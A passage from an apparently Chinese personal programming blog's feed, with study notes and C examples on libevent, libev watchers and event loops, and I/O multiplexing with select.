class="hljs-keyword">struct</span> event_base *base,<br>    evconnlistener_cb cb, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">unsigned</span> flags, <span class="hljs-type">int</span> backlog,<br>    <span class="hljs-type">evutil_socket_t</span> fd);<br><br>evconnlistener_disable(<span class="hljs-keyword">struct</span> evconnlistener *lev);<br>evconnlistener_enable(<span class="hljs-keyword">struct</span> evconnlistener *lev);<br><span class="hljs-comment">//重新设置回调函数</span><br>evconnlistener_set_cb(<span class="hljs-keyword">struct</span> evconnlistener *lev,<br>    evconnlistener_cb cb, <span class="hljs-type">void</span> *arg);<br><br><br><span class="hljs-comment">//创建缓冲区</span><br><span class="hljs-keyword">struct</span> bufferevent *<span class="hljs-title function_">bufferevent_socket_new</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base,<span class="hljs-type">int</span> fd,<span class="hljs-type">int</span> option)</span>;<br><br><span class="hljs-comment">//设置回调函数</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title function_">bufferevent_setcb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev,</span><br><span class="hljs-params">    bufferevent_data_cb readcb, bufferevent_data_cb writecb,</span><br><span class="hljs-params">    bufferevent_event_cb eventcb, <span class="hljs-type">void</span> *cbarg)</span><br><br><span class="hljs-keyword">struct</span> bufferevent *<span class="hljs-title function_">bufferevent_connect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa, <span class="hljs-type">int</span> socklen)</span>;<br><span class="hljs-comment">//从libevent自行维护的缓冲区中读取数据</span><br><span class="hljs-type">size_t</span><br><span class="hljs-title function_">bufferevent_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> size)</span>;<br><br><span class="hljs-comment">//向libevent自行维护的缓冲区中写入数据</span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">bufferevent_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> size)</span>;<br><br></code></pre></td></tr></table></figure><h4 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event2/listener.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-comment">//读回调函数</span><br>bufferevent_data_cb <span class="hljs-title function_">read_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];<br>    bufferevent_read(bev, buffer, <span class="hljs-number">10</span>);<span class="hljs-comment">//从接收缓冲区读取数据</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read buffer :%s\n&quot;</span>, buffer);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-comment">//写回调函数</span><br>bufferevent_data_cb <span class="hljs-title function_">write_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;hello,world&quot;</span>;<br>    bufferevent_write(bev, str, <span class="hljs-built_in">strlen</span>(str) + <span class="hljs-number">1</span>);<span class="hljs-comment">//向客户端发送消息</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-comment">//异常处理函数</span><br>bufferevent_event_cb <span class="hljs-title function_">error_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev, <span class="hljs-type">short</span> event, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>evconnlistener_cb<br><span class="hljs-title function_">listen_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *listener, <span class="hljs-type">evutil_socket_t</span> fd, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">int</span> socklen,</span><br><span class="hljs-params">          <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-comment">//这个回调函数传进来的fd为与客户端的通信的fd不是监听的fd</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">base</span> =</span> (<span class="hljs-keyword">struct</span> event_base *) arg;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bufferevent</span> *<span class="hljs-title">buffevent</span> =</span> bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);<span class="hljs-comment">//创建缓冲区</span><br>    bufferevent_setcb(buffevent, read_cb, write_cb, error_cb, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//设置回调函数</span><br>    bufferevent_enable(bufferevent,EV_READ|EV_PRESIST|EV_WRITE);<span class="hljs-comment">//注册事件</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-type">socklen_t</span> SOCKLEN = (<span class="hljs-type">socklen_t</span>) (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">base</span> =</span> event_base_new();<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">bind_addr</span>;</span><br>    convertip_to_net(AF_INET, &amp;bind_addr, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">10000</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">evconnlistener</span> *<span class="hljs-title">listener</span> =</span> evconnlistener_new_bind(base, listen_cb, (<span class="hljs-type">void</span> *) base,<br>LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE_PORT, <span class="hljs-number">-1</span>,<br>&amp;bind_addr, SOCKLEN);<br>    event_base_dispatch(base);<span class="hljs-comment">//循环监听事件</span><br>    evconnlistener_free(listener);<span class="hljs-comment">//释放连接监听器</span><br>    event_base_free(base);<span class="hljs-comment">//释放监听集合;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>参考<a href="https://aceld.gitbooks.io/libevent/content/chapter1.html">https://aceld.gitbooks.io/libevent/content/chapter1.html</a></p>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libev学习笔记</title>
    <link href="/2022/04/17/libev%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/04/17/libev%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="libev学习笔记"><a href="#libev学习笔记" class="headerlink" title="libev学习笔记"></a>libev学习笔记</h1><h3 id="1-什么是libev"><a href="#1-什么是libev" class="headerlink" title="1.什么是libev?"></a>1.什么是libev?</h3><p>libev是一个强大的网络reactor,支持多种事件(信号,I&#x2F;O,定时器…..)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//基本数据类型的宏定义</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_A  loop </span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_A_ EV_A,</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_P  struct ev_loop *loop </span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_P_ EV_P,</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ev_io</span></span><br><span class="hljs-class">&#123;</span><br>  EV_WATCHER_LIST (ev_io)<br>  <span class="hljs-type">int</span> fd;     <span class="hljs-comment">/* ro */</span><br>  <span class="hljs-type">int</span> events; <span class="hljs-comment">/* ro */</span><br>&#125; ev_io;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ev_loop</span></span><br><span class="hljs-class">  &#123;</span><br>    ev_tstamp ev_rt_now;<br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> ev_rt_now ((loop)-&gt;ev_rt_now)</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> VAR(name,decl) decl;</span><br>      <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ev_vars.h&quot;</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">undef</span> VAR</span><br>  &#125;;<br></code></pre></td></tr></table></figure><h3 id="2-使用方法"><a href="#2-使用方法" class="headerlink" title="2.使用方法"></a>2.使用方法</h3><h4 id="1-创建ev-loop对象"><a href="#1-创建ev-loop对象" class="headerlink" title="1.创建ev_loop对象"></a>1.创建ev_loop对象</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> ev_loop *<span class="hljs-title function_">ev_loop_new</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flag)</span>;<br><span class="hljs-comment">//创建一个ev_loop对象,这里的flag用于选择什么backend来实现多路复用</span><br><span class="hljs-comment">//flag的一些宏定义,一般用于选择后台多路复用机制,一般使用EVFLAG_AUTO(0)即可</span><br><br>* EVBACKEND_SELECT<br>* EVBACKEND_POLL<br>* EVBACKEND_EPOLL                       <br>* EVBACKEND_KQUEUE<br>* EVBACKEND_DEVPOLL<br>* EVBACKEND_PORT<br><br>* EVFLAG_NOINOTIFY                     <span class="hljs-comment">// 不适用inofity调用来使用ev_stat.这样可以减少fd使用。</span><br>* EVFLAG_SIGNALFD                      <span class="hljs-comment">// 使用signalfd来检测信号是否发生，同样这样可以减少fd</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ev_loop_destroy</span><span class="hljs-params">(EV_P)</span>;<br><span class="hljs-comment">//销毁一个ev_loop对象</span><br></code></pre></td></tr></table></figure><h4 id="2-绑定用户数据以及reactor的开始与退出"><a href="#2-绑定用户数据以及reactor的开始与退出" class="headerlink" title="2.绑定用户数据以及reactor的开始与退出"></a>2.绑定用户数据以及reactor的开始与退出</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">void</span> <span class="hljs-title function_">ev_set_userdata</span><span class="hljs-params">(EV_P_ <span class="hljs-type">void</span> *data)</span>;<br>  <span class="hljs-type">void</span> *<span class="hljs-title function_">ev_userdata</span><span class="hljs-params">(EV_P)</span>;<br>  <span class="hljs-comment">//ev_loop如何运行和停止   </span><br>  <span class="hljs-type">void</span> <span class="hljs-title function_">ev_run</span><span class="hljs-params">(EV_P_ <span class="hljs-type">int</span> flags)</span>;<br>  <span class="hljs-type">void</span> <span class="hljs-title function_">ev_break</span><span class="hljs-params">(EV_P_ <span class="hljs-type">int</span> how)</span>;<br>  <span class="hljs-comment">//flags参数</span><br>* <span class="hljs-number">0</span>             <span class="hljs-comment">//通常这是我们想要的，每次轮询在poll都会等待一段时间然后处理pending事件。</span><br>* EVRUN_NOWAIT  <span class="hljs-comment">//运行一次，在poll时候不会等待。这样效果相当于只是处理pending事件。</span><br>* EVRUN_ONCE    <span class="hljs-comment">//运行一次，但是在poll时候会等待，然后处理pending事件。</span><br>而how有下面这几个：<br><br>* EVBREAK_ONE   <span class="hljs-comment">//只是退出一次ev_run这个调用。通常来说使用这个就可以了。</span><br>* EVBREAK_ALL   <span class="hljs-comment">//退出所有的ev_run调用。这种情况存在于ev_run在pengding处理时候会递归调</span><br>ev_set_loop_release_cb (EV_P_ <span class="hljs-type">void</span> (*release)(EV_P) EV_NOEXCEPT, <span class="hljs-type">void</span> (*acquire)(EV_P) EV_NOEXCEPT)     <span class="hljs-comment">//设置回调函数,用于epoll_wait前后调用</span><br></code></pre></td></tr></table></figure><h4 id="3-设置轮询时间"><a href="#3-设置轮询时间" class="headerlink" title="3.设置轮询时间"></a>3.设置轮询时间</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//在event_loop里面我们还关心一件事情，就是每次event_loop轮询的时间长短。通常来说这个不会是太大问题，但是在高性能情况下面我们需要设置</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ev_set_io_collect_interval</span><span class="hljs-params">(EV_P_ ev_tstamp interval)</span>;<span class="hljs-comment">//设置轮询时间</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ev_set_timeout_collect_interval</span><span class="hljs-params">(EV_P_ ev_tstamp interval)</span>;<span class="hljs-comment">//设置超时时间</span><br></code></pre></td></tr></table></figure><h4 id="4-Watcher"><a href="#4-Watcher" class="headerlink" title="4.Watcher"></a>4.Watcher</h4><p>watcher 相当于eventhandler,一般ev_loop用于创建libev里面的reactor对象,而watcher就是事件触发后处理事件的模块,通常绑定fd,以及发生事件后处理事件的回调函数,下列的type用于区分不同的watcher<br>watcher的状态</p><ul><li><p>initialiased 已经初始化</p></li><li><p>active 调用start进行注册</p></li><li><p>pending 已经触发事件但是还没有处理</p></li><li><p>inactive 调用stop注销.这个状态和已经初始化是一样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ev_loop *loop, ev_TYPE *watcher, <span class="hljs-type">int</span> revents)</span> callback; <span class="hljs-comment">// callback都是这种类型</span><br>ev_init (ev_TYPE *watcher, callback);                         <span class="hljs-comment">// 初始化watcher</span><br>ev_TYPE_set (ev_TYPE *watcher, [args]);                       <span class="hljs-comment">// 设置watcher</span><br>ev_TYPE_init (ev_TYPE *watcher, callback, [args]);            <span class="hljs-comment">// 通常使用这个函数最方便，初始化和设置都在这里</span><br>ev_TYPE_start (loop, ev_TYPE *watcher);                       <span class="hljs-comment">// 注册watcher</span><br>ev_TYPE_stop (loop, ev_TYPE *watcher);                        <span class="hljs-comment">// 注销watcher</span><br>ev_set_priority (ev_TYPE *watcher, <span class="hljs-type">int</span> priority);             <span class="hljs-comment">// 设置优先级</span><br>ev_feed_event (loop, ev_TYPE *watcher, <span class="hljs-type">int</span> revents);          <span class="hljs-comment">// 这个做跨线程通知非常有用，相当于触发了某个事件。</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">ev_is_active</span> <span class="hljs-params">(ev_TYPE *watcher)</span>;                         <span class="hljs-comment">// watcher是否active.</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">ev_is_pending</span> <span class="hljs-params">(ev_TYPE *watcher)</span>;                        <span class="hljs-comment">// watcher是否pending.</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ev_clear_pending</span> <span class="hljs-params">(loop, ev_TYPE *watcher)</span>;                <span class="hljs-comment">// 清除watcher pending状态并且返回事件</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="5-实例"><a href="#5-实例" class="headerlink" title="5.实例"></a>5.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//一个简单的io驱动事件</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ev.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">stdin_cb</span><span class="hljs-params">(EV_P_ ev_io *w,<span class="hljs-type">int</span> revents)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hello,world&quot;</span>);<br>    ev_io_stop(EV_A_ w);<br>    ev_break(EV_A_ EVBREAK_ALL);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ev_loop</span> *<span class="hljs-title">loop</span>=</span> EV_DEFAULT;<br>    ev_io stdin_watcher;<br>    ev_io_init(&amp;stdin_watcher,stdin_cb,<span class="hljs-number">0</span>,EV_READ);<span class="hljs-comment">//初始化watcher,设置事件处理的回调函数</span><br>    ev_io_start(loop,&amp;stdin_watcher);<span class="hljs-comment">//设置reactor的watcher</span><br>    ev_run(loop,<span class="hljs-number">0</span>);<span class="hljs-comment">//开始监听事件的到来,一旦事件到来,指向对应的watcher中的回调函数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="6-和epoll对比"><a href="#6-和epoll对比" class="headerlink" title="6.和epoll对比"></a>6.和epoll对比</h4><p>ev_loop相当于struct event_base *base,监听集合<br>watcher相当于struct event *event,但是相比于epoll中的event,watcher中设置了相应的回调函数。<br>ev_run相当于epoll_wait函数开始监听事件的到来,到事件到来的时候调用相应的回调函数处理相应的事件</p>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>I/O多路复用</title>
    <link href="/2022/04/17/I-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/"/>
    <url>/2022/04/17/I-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="I-x2F-O多路复用"><a href="#I-x2F-O多路复用" class="headerlink" title="I&#x2F;O多路复用"></a>I&#x2F;O多路复用</h1><h3 id="1-什么是I-x2F-O多路复用"><a href="#1-什么是I-x2F-O多路复用" class="headerlink" title="1.什么是I&#x2F;O多路复用"></a>1.什么是I&#x2F;O多路复用</h3><p>I&#x2F;O 多路复用是一种同步IO模型，实现一个线程可以监视多个文件句柄；<br>一旦某个文件句柄就绪，就能够通知应用程序进行相应的读写操作；<br>没有文件句柄就绪就会阻塞应用程序，交出CPU。</p><h3 id="2-为什么会有I-x2F-O多路复用机制"><a href="#2-为什么会有I-x2F-O多路复用机制" class="headerlink" title="2.为什么会有I&#x2F;O多路复用机制"></a>2.为什么会有I&#x2F;O多路复用机制</h3><p>没有IO多路复用机制时，有BIO、NIO两种实现方式，但它们都有一些问题</p><h5 id="1-同步阻塞"><a href="#1-同步阻塞" class="headerlink" title="1.同步阻塞"></a>1.同步阻塞</h5><p>服务端采用单线程，当 accept 一个请求后，在 recv 或 send 调用阻塞时，将无法 accept 其他请求（必须等上一个请求处理 recv 或 send 完 ）（无法处理并发）</p><p>服务端采用多线程，当 accept 一个请求后，开启线程进行 recv，可以完成并发处理，但随着请求数增加需要增加系统线程，大量的线程占用很大的内存空间，并且线程切换会带来很大的开销，10000个线程真正发生读写实际的线程数不会超过20%，每次accept都开一个线程也是一种资源浪费。</p><h5 id="2-异步阻塞"><a href="#2-异步阻塞" class="headerlink" title="2.异步阻塞"></a>2.异步阻塞</h5><p>服务器端当 accept 一个请求后，加入 fds 集合，每次轮询一遍 fds 集合 recv (非阻塞)数据，没有数据则立即返回错误，每次轮询所有 fd （包括没有发生读写实际的 fd）会很浪费 CPU资源</p><h3 id="3-实现I-x2F-O多路复用的几种方式"><a href="#3-实现I-x2F-O多路复用的几种方式" class="headerlink" title="3.实现I&#x2F;O多路复用的几种方式"></a>3.实现I&#x2F;O多路复用的几种方式</h3><ul><li><p>1.select</p></li><li><p>2.poll</p></li><li><p>3.epoll</p></li></ul><h4 id="1-select实现I-x2F-O多路复用"><a href="#1-select实现I-x2F-O多路复用" class="headerlink" title="1.select实现I&#x2F;O多路复用"></a>1.select实现I&#x2F;O多路复用</h4><h5 id="1-1-涉及的api"><a href="#1-1-涉及的api" class="headerlink" title="1.1.涉及的api"></a>1.1.涉及的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">select</span><span class="hljs-params">(<span class="hljs-type">int</span> nfds,fd_set *readfds,fd_set *writefds,fd_set exceptfds,<span class="hljs-keyword">struct</span> timeval *timeout)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pselect</span><span class="hljs-params">(<span class="hljs-type">int</span> nfds,fd_set *readfds,fd_set *writefds,fd_set *exceptfds,<span class="hljs-keyword">struct</span> timeval *timeout,<span class="hljs-type">sigset_t</span> sigmask)</span>;<br><span class="hljs-comment">//功能:阻塞监听多个文件描述符的变化(可被信号打断)</span><br><br><span class="hljs-comment">//参数</span><br><span class="hljs-comment">//nfds为监听的最大文件描述符+1</span><br><span class="hljs-comment">//readfds,writefds,exceptfds分别为监听可读，可写,异常集合</span><br><span class="hljs-comment">//timeval为超时时间</span><br><br><span class="hljs-comment">//返回值</span><br><span class="hljs-comment">//正常返回变化的文件描述符总个数,超时返回0,错误返回-1</span><br><br>FD_ZERO(fd_set *<span class="hljs-built_in">set</span>);<br><span class="hljs-comment">//将集合清零</span><br><br>FD_SET(<span class="hljs-type">int</span> fd,fd_set *<span class="hljs-built_in">set</span>);<br><span class="hljs-comment">//将文件描述符添加到集合</span><br><br>FD_CLR(<span class="hljs-type">int</span> fd,fd_set *<span class="hljs-built_in">set</span>);<br><span class="hljs-comment">//将监听的文件描述符从集合中移除</span><br></code></pre></td></tr></table></figure><h5 id="1-2-操作实例"><a href="#1-2-操作实例" class="headerlink" title="1.2.操作实例"></a>1.2.操作实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br><span class="hljs-type">int</span> fd = New_Socket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], <span class="hljs-number">10</span>);<br><span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create Socket error!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br>fd_set fdset, rset;<br><span class="hljs-comment">//创建监听集合</span><br>FD_ZERO(&amp;fdset);<br><span class="hljs-comment">//将需要监听的文件描述符加入到监听集合</span><br>FD_SET(fd, &amp;fdset);<br>    .....<br><span class="hljs-type">int</span> maxfd = fd + <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">timeout</span> =</span> &#123; <span class="hljs-number">20</span>, 